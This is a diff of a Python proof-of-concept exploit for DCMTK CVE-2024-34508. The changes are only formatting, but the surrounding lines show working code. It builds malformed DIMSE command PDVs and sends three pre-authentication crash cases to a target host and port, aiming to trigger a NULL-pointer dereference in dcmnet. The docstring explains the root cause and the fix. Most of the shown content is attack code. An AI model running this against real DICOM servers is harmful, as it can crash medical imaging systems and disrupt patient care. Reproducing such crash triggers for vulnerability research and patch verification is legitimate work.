@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PoC for DCMTK CVE-2024-34508 (DCMTK issue #1114) — dcmnet NULL-pointer deref
+PoC for DCMTK CVE-2024-34508 (DCMTK issue #1114) - dcmnet NULL-pointer deref
 while parsing an INVALID incoming DIMSE message.
 
 VERIFIED crash (real DCMTK 3.6.8 built with ASan+UBSan):
@@ -21,7 +21,7 @@ Root cause (fixed in commit c78e434c, DCMTK-3.6.9):
   returns NULL, so aString == NULL and strncpy(s, NULL, 64) dereferences NULL.
   The fix wraps the strncpy/strip block in `if (ec.good())`.
 
-Why the value fails to load — the DIMSE command set is read incrementally from
+Why the value fails to load - the DIMSE command set is read incrementally from
 a DcmInputBufferStream, one P-DATA-TF PDV fragment at a time (dcmnet/libsrc/
 dimse.cc DIMSE_receiveCommand). We declare AffectedSOPClassUID (0000,0002) with
 a 64-byte value length but stop the fragment chain before the value bytes
@@ -33,10 +33,11 @@ The NULL-deref is sensitive to the allocator state, so this PoC drives THREE
 malformed associations in sequence (header-only, header+partial, single-PDV);
 the combination deterministically lands on the uninitialised-value path. Each
 case is an A-ASSOCIATE handshake (Verification SOP) + malformed command PDV(s),
-PRE-AUTH — no real C-ECHO completes.
+PRE-AUTH - no real C-ECHO completes.
 
 Usage: poc_getstring_34508.py <host> <port>
 """
+
 import socket
 import struct
 import sys
@@ -78,10 +79,10 @@ def p_data_tf(*pdvs):
 def command_up_to_value_header():
     """C-ECHO-RQ command group (implicit VR LE) ending at the AffectedSOPClassUID
     element header which declares a 64-byte value (value bytes NOT included)."""
-    head = struct.pack("<HHI", 0x0000, 0x0100, 2) + struct.pack("<H", 0x0030)   # C-ECHO-RQ
+    head = struct.pack("<HHI", 0x0000, 0x0100, 2) + struct.pack("<H", 0x0030)  # C-ECHO-RQ
     head += struct.pack("<HHI", 0x0000, 0x0110, 2) + struct.pack("<H", 0x0001)  # MessageID
     head += struct.pack("<HHI", 0x0000, 0x0800, 2) + struct.pack("<H", 0x0101)  # DataSetType=NULL
-    aff_hdr = struct.pack("<HHI", 0x0000, 0x0002, 64)                           # UI len=64, no value
+    aff_hdr = struct.pack("<HHI", 0x0000, 0x0002, 64)  # UI len=64, no value
     grouplen = struct.pack("<HHI", 0x0000, 0x0000, 4) + struct.pack("<I", len(head) + 8 + 64)
     return grouplen + head + aff_hdr
 
@@ -135,11 +136,19 @@ def main():
 
     partial = command_up_to_value_header()
     # Case A: header-only command across two PDVs (not-last, then last-empty)
-    one_case(host, port, [p_data_tf(pdv(1, 0x00, partial)),
-                          p_data_tf(pdv(1, 0x02, b""))], "A:hdr-then-lastempty")
+    one_case(
+        host,
+        port,
+        [p_data_tf(pdv(1, 0x00, partial)), p_data_tf(pdv(1, 0x02, b""))],
+        "A:hdr-then-lastempty",
+    )
     # Case B: header + 8 of 64 value bytes (not-last), then last-empty
-    one_case(host, port, [p_data_tf(pdv(1, 0x00, partial + b"1.2.840\x00")),
-                          p_data_tf(pdv(1, 0x02, b""))], "B:hdr+8-then-lastempty")
+    one_case(
+        host,
+        port,
+        [p_data_tf(pdv(1, 0x00, partial + b"1.2.840\x00")), p_data_tf(pdv(1, 0x02, b""))],
+        "B:hdr+8-then-lastempty",
+    )
     # Case C: single PDV marked last, 64-byte value declared, none supplied
     one_case(host, port, [p_data_tf(pdv(1, 0x03, partial))], "C:single-last-no-value")
 
